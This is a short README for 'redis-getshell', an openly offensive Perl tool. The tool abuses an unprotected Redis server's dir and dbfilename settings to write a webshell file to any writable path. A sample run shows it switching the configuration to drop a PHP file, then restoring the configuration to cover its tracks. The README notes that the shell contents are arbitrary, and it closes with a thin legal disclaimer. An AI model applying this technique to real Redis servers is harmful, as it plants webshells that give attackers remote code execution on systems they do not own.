## redis-getshell

The script below demonstrates the possibility to dump a webshell through a redis server

## usage

<pre>
%> ./redis-getshell.pl --host 127.0.0.1 --port 6379 --path /tmp/ooo.php
[+] Connection established 127.0.0.1:6379
[+] Receiving old dbfilename value
[+] Receiving old dir value
[+] Alternating configuration
    -> dir /tmp
    -> dbfilename ooo.php
    -> webshell <?php phpinfo (); ?>
[+] Restoring configuration
</pre>

The script allow you to dump a file to anywhere writable, with arbritrary contents (--webshell parameter)

## legal disclaimer

Using this tool is legit but hacking may not be. The author does not take any responsibility for such activities.
